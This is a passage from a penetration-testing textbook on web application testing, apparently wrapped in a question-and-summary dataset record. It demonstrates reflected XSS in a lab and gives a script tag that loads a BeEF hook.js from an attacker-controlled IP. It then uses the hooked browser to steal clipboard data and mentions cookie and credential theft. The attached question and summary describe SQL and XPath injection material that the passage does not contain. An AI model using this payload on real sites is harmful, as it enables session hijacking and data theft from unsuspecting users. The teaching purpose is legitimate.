Windows 7 target with Internet Explorer. As shown in Figure 14-22, the pop-up alert script\nexecutes. Having determined that reflective XSS is\npresent, we could try to leverage it to attack users. Common attacks include stealing session cookies Figure 14-22: XSS\nto send to an attacker-controlled site or embed- pop-up\nding a frame (a way of splitting an HTML page\ninto different segments) to prompt the user for\nlogin credentials. A user may think that the frame\nis part of the original page and enter his or her cre-\ndentials, which are then sent offsite to the attacker. 330 Chapter 14\nLeveraging XSS with the Browser Exploitation Framework\nXSS issues tend to be overlooked. How much damage can an alert box that\nsays “XSS” do anyway? A good tool for leveraging XSS issues and uncovering\ntheir true attack potential is the Browser Exploitation Framework (BeEF). Using BeEF, we can “hook” a browser by tricking the user into browsing to\nour BeEF server, or better yet using the BeEF JavaScript hook as a payload\nin the presence of an XSS vulnerability like the one discussed previously. Now change directories to /usr/share/beef-xss, and run ./beef, as shown\nin Listing 14-3. This will start the BeEF server, including the web interface\nand the attack hook. root@kali:~# cd /usr/share/beef-xss/\nroot@kali:/usr/share/beef-xss# ./beef\n[11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000]. [11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha\n--snip--\n[11:53:27][+] running on network interface: 192.168.20.9\n[11:53:27] | Hook URL: http://192.168.20.9:3000/hook.js\n[11:53:27] |_ UI URL: http://192.168.20.9:3000/ui/panel\n[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf\n[11:53:27][*] HTTP Proxy: http://127.0.0.1:6789\n[11:53:27][*] BeEF server started (press control+c to stop)\nListing 14-3: Starting BeEF\nNow in Kali, browse to http://192.168.20.9:3000/ui/panel to access the\nBeEF web interface. You should be presented with a login page, like the one\nshown in Figure 14-23. Figure 14-23: BeEF login page\nWeb Application Testing 331\nThe default credentials for BeEF are beef:beef. After you enter them in\nthe login dialog, you are shown the web interface (Figure 14-24). Figure 14-24: BeEF web interface\nCurrently no browsers are hooked in BeEF, so we need to trick some-\none into loading and running BeEF’s malicious hook.js script. Let’s return to\nour XSS vulnerability in the Book Search box. This time, instead of using\nan alert dialog, let’s leverage the issue to load BeEF’s hook.js in the target\nbrowser. From the Windows 7 Internet Explorer browser, enter \"<script\nsrc=http://192.168.20.9:3000/hook.js></script>\" into the Book Search box,\nand click Go. This time there will be no alert box or other indication to\nthe user suggesting that anything is amiss, but if you turn back to BeEF, you\nshould see the IP address of the Windows 7 box in the Online Browsers list\nat the left of the screen, as shown in Figure 14-25. In the details pane, with the IP address of Windows 7 selected in BeEF,\nyou can see details about the hooked browser as well as the underlying\nsystem, such as versions and installed software. At the top of the pane are\nadditional tabs, such as Logs and Commands. Click Commands to see addi-\ntional BeEF modules you can run against the hooked browser. 332 Chapter 14\nFigure 14-25: A hooked browser\nFor example, as shown in Figure 14-26, navigate to Browser4Hooked\nDomain4Create Alert Dialog. At the right of the screen, you have the option\nto change the alert text. When you finish, click Execute at the bottom right. Figure 14-26: Running a BeEF module\nWeb Application Testing 333\nTurn back to your Windows 7 browser. You should see the pop-up\ndialog, shown in Figure 14-27. Figure 14-27: Causing an alert in the hooked browser\nAnother interesting BeEF command allows you to steal data from the\nWindows clipboard. On the Windows 7 system, copy some text to the clip-\nboard. Now in BeEF, navigate in the Commands Module Tree to Host4Get\nClipboard. The text on the clipboard is displayed in the Command Results\nPane on the right, as shown in Figure 14-28. Figure 14-28: Stealing clipboard information\nIn this section we have looked at only two simple examples of lever-\naging a hooked browser with BeEF. There is plenty more we can do. For\nexample, we can use the target browser as a pivot to start gathering infor-\nmation about the local network with ping sweeps or even port scans. You\n334 Chapter 14\ncan even integrate BeEF with Metasploit. On your pentests, you can use\nBeEF as part of social-engineering attacks.",
    "question": "What are the key methods for finding and exploiting SQL injection and XPath injection vulnerabilities in web applications, and how do these techniques allow an attacker to gain unauthorized access or execute arbitrary commands on the target system?",
    "summary": "The text discusses various web application vulnerabilities, including SQL injection, XPath injection, local and remote file inclusion, and cross-site scripting (XSS). It explains how to use tools like Burp Proxy and SQLMap to exploit these vulnerabilities and gain unauthorized access to systems. Additionally, it covers how to use the Browser Exploitation Framework (BeEF) to leverage XSS vulnerabilities for further attacks, such as stealing clipboard data or executing commands on the target system."
  }
]